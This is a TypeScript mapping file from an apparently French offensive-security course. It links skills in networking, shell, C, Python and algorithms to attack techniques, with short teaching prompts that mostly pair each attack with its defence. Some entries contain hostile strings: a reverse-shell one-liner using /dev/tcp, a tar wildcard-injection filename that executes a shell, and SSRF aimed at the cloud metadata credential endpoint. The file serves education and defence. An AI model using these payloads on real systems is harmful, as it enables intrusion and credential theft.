/**
 * Mapping skill → technique Code Noir à attaquer après maîtrise.
 *
 * Parcours 5 modules (offensive-security) : Réseau (m01), Shell (m02),
 * C (m03), Python (m24), Algo (m00). Quand l'apprenant maîtrise un skill
 * listé en clé, le lesson player lui propose la technique Code Noir
 * correspondante (déjà unlocked au niveau du module, mais pertinente
 * maintenant).
 *
 * Mapping côté frontend (pas en DB), suffisant tant que les techniques
 * restent statiques. Les slugs doivent matcher CODE_NOIR_TECHNIQUES (backend).
 */
export type CodeNoirSkillLink = {
  /** Slug de la technique dans CODE_NOIR_TECHNIQUES (backend) */
  techniqueSlug: string;
  /** Titre affiché */
  techniqueTitle: string;
  /** "duo" | "offensive" | "defensive" */
  kind: "offensive" | "defensive" | "duo";
  /** Phrase d'invitation contextuelle (pédagogique) */
  invitation: string;
};

/** Indexé par skill slug (unique cross-module dans le seed). */
export const CODE_NOIR_BY_SKILL: Record<string, CodeNoirSkillLink> = {
  // ===================== Réseau (m01) =====================
  "http-anatomy": {
    techniqueSlug: "host-header-injection",
    techniqueTitle: "Host Header Poisoning",
    kind: "duo",
    invitation:
      "Tu sais lire une requête HTTP brute ? Attaque une faille où le serveur fait confiance au header Host envoyé par le client (reset password vers evil.com).",
  },
  "http-versions": {
    techniqueSlug: "http-smuggling",
    techniqueTitle: "HTTP Request Smuggling (CL.TE / TE.CL)",
    kind: "duo",
    invitation:
      "HTTP/1.1 et le désaccord proxy frontend / backend → tu injectes une 2e requête préfixée à celle de la victime suivante. Le bug bounty à 5 chiffres préféré de James Kettle.",
  },
  "dns-deep": {
    techniqueSlug: "dns-rebinding",
    techniqueTitle: "DNS Rebinding",
    kind: "offensive",
    invitation:
      "TTL court + Same-Origin Policy = tu fais frapper le routeur local d'une victime depuis ton domaine. Attaque culte sur les services internes.",
  },
  "ethernet-arp": {
    techniqueSlug: "arp-spoofing-mitm",
    techniqueTitle: "ARP Spoofing → MITM",
    kind: "duo",
    invitation:
      "Tu comprends ARP (L2) ? Empoisonne le cache ARP du LAN et place-toi en man-in-the-middle pour sniffer/altérer le trafic. Uniquement sur un réseau que tu possèdes.",
  },
  "tls-pki": {
    techniqueSlug: "tls-downgrade",
    techniqueTitle: "TLS Downgrade / SSL Stripping",
    kind: "duo",
    invitation:
      "Tu maîtrises le handshake TLS et la PKI ? Vois comment un MITM force un downgrade ou strip le HTTPS — et pourquoi HSTS preload + TLS 1.3 ferment la porte.",
  },
  "ports-sockets": {
    techniqueSlug: "ssrf",
    techniqueTitle: "SSRF — Server-Side Request Forgery",
    kind: "duo",
    invitation:
      "Tu sais ce qu'est un port et un socket côté serveur ? Si une URL vient du user, tu frappes les services internes et 169.254.169.254 (creds IAM cloud). Bypass de filtres inclus.",
  },

  // ===================== Shell (m02) =====================
  scripting: {
    techniqueSlug: "command-injection",
    techniqueTitle: "OS Command Injection (shell)",
    kind: "duo",
    invitation:
      "Tu écris des scripts qui prennent de l'input ? Vois comment un point-virgule ou un $(...) dans un argument fait exécuter au serveur une commande arbitraire — et la vraie parade (execFile + tableau d'args, jamais le shell).",
  },
  "pipes-redirect": {
    techniqueSlug: "reverse-shell",
    techniqueTitle: "Reverse Shell (bind vs reverse)",
    kind: "offensive",
    invitation:
      "Tu maîtrises les redirections (>&, /dev/tcp) ? C'est exactement le cœur d'un reverse shell : `bash -i >& /dev/tcp/IP/4444 0>&1`. Comprends-le pour le détecter (egress filtering, EDR). Labs autorisés uniquement.",
  },
  permissions: {
    techniqueSlug: "suid-privesc",
    techniqueTitle: "Privilege Escalation Linux (SUID, sudo, PATH)",
    kind: "duo",
    invitation:
      "Tu comprends rwx et le bit SUID ? Vois comment un binaire SUID mal choisi (cf. GTFOBins), un sudoers laxiste ou un PATH détournable donnent root. Audit SUID + sudoers minimal.",
  },
  cron: {
    techniqueSlug: "cron-persistence",
    techniqueTitle: "Persistance (cron, systemd, authorized_keys)",
    kind: "duo",
    invitation:
      "Tu sais planifier une tâche cron ? C'est aussi le vecteur de persistance n°1 : cron, timers systemd, .bashrc, authorized_keys. La défense : baseline + détection des changements.",
  },
  files: {
    techniqueSlug: "wildcard-injection",
    techniqueTitle: "Wildcard / Glob Injection",
    kind: "duo",
    invitation:
      "Tu manipules fichiers et globs ? Un fichier nommé `--checkpoint-action=exec=sh` passé à `tar *` exécute du code. Parade : `./` devant les globs, getopt strict, ne jamais globber l'input.",
  },
  processes: {
    techniqueSlug: "lolbins-fileless",
    techniqueTitle: "Living off the Land (LOLBins / fileless)",
    kind: "offensive",
    invitation:
      "Tu gères les processus (ps, kill, &) ? Les attaquants évitent de poser des fichiers : ils abusent des binaires légitimes (curl, bash, python, certutil) en mémoire. Détection comportementale + logging (auditd/Sysmon).",
  },

  // ===================== C & bas niveau (m03) =====================
  "buffer-overflow-stack": {
    techniqueSlug: "buffer-overflow-stack",
    techniqueTitle: "Stack Buffer Overflow",
    kind: "duo",
    invitation:
      "Tu sais qu'un `char buf[64]` vit sur la pile ? Dépasse-le et tu écrases l'adresse de retour. Comprends l'exploit naïf ET pourquoi canaries/NX/ASLR/PIE le cassent.",
  },
  "use-after-free": {
    techniqueSlug: "use-after-free",
    techniqueTitle: "Use-After-Free / Double-Free",
    kind: "duo",
    invitation:
      "Tu as fait `free(p)` sans `p = NULL` ? Le pointeur pend encore. Réalloué avec du contenu contrôlé, c'est une primitive d'exploitation. Parade : free()+NULL, ASan.",
  },
  "format-string": {
    techniqueSlug: "format-string",
    techniqueTitle: "Format String (%n, %x)",
    kind: "duo",
    invitation:
      "Tu as écrit `printf(input)` au lieu de `printf(\"%s\", input)` ? `%x`/`%n` lisent et écrivent la mémoire. Compile avec -Wformat-security pour le voir.",
  },
  "integer-overflow": {
    techniqueSlug: "integer-overflow-c",
    techniqueTitle: "Integer Overflow → Heap Overflow",
    kind: "duo",
    invitation:
      "Tu calcules une taille d'alloc à partir d'un input ? Un overflow entier rend `malloc(n)` trop petit → heap overflow. Vérifie avec __builtin_*_overflow, UBSan.",
  },
  "dynamic-allocation": {
    techniqueSlug: "heap-exploitation",
    techniqueTitle: "Heap Exploitation (intro)",
    kind: "offensive",
    invitation:
      "Tu maîtrises malloc/free ? Le tas a des métadonnées : double-free et tcache poisoning détournent l'allocateur. Intro conceptuelle. Parade : allocateurs durcis, ASan.",
  },
  "function-pointers": {
    techniqueSlug: "rop-intro",
    techniqueTitle: "Return-Oriented Programming (intro)",
    kind: "offensive",
    invitation:
      "Tu comprends les pointeurs de fonction et le flux de contrôle ? Quand NX interdit d'exécuter la pile, on enchaîne des gadgets existants (ROP). Parade : CFI, PIE+ASLR, shadow stack.",
  },

  // ===================== Python (m24) =====================
  "io-csv-json": {
    techniqueSlug: "python-unsafe-deserialization",
    techniqueTitle: "Python — désérialisation non sûre (pickle / yaml / eval)",
    kind: "duo",
    invitation:
      "Tu parses des fichiers/données en Python ? Trois portes vers la RCE : pickle.loads, yaml.load sans SafeLoader, eval/exec sur input. JSON + Pydantic, safe_load, jamais eval.",
  },
  "uv-ruff": {
    techniqueSlug: "supply-chain-pip",
    techniqueTitle: "Supply Chain (pip / PyPI)",
    kind: "duo",
    invitation:
      "Tu gères tes dépendances avec uv/pip ? Typosquatting, takeover de mainteneur, postinstall malveillant : un paquet exfiltre ton .env à l'install. Pinning + index privé + audit.",
  },
  venv: {
    techniqueSlug: "dependency-confusion",
    techniqueTitle: "Dependency Confusion",
    kind: "duo",
    invitation:
      "Tu isoles tes envs ? Un package interne usurpé sur l'index public est installé à la place du tien. Parade : index privé prioritaire, scoping, vérif de provenance.",
  },

  // ===================== Algorithmie (m00) =====================
  hashmaps: {
    techniqueSlug: "hash-flooding-dos",
    techniqueTitle: "Hash Flooding DoS",
    kind: "duo",
    invitation:
      "Tu sais qu'une hashmap est O(1) amorti mais O(n) au pire ? Des clés en collision forcent le pire cas → CPU à genoux. Parade : hash randomisé (SipHash), limites de taille.",
  },
};

/** Helper : retourne le lien Code Noir d'un skill, ou null. */
export function getCodeNoirLink(skillSlug: string): CodeNoirSkillLink | null {
  return CODE_NOIR_BY_SKILL[skillSlug] ?? null;
}
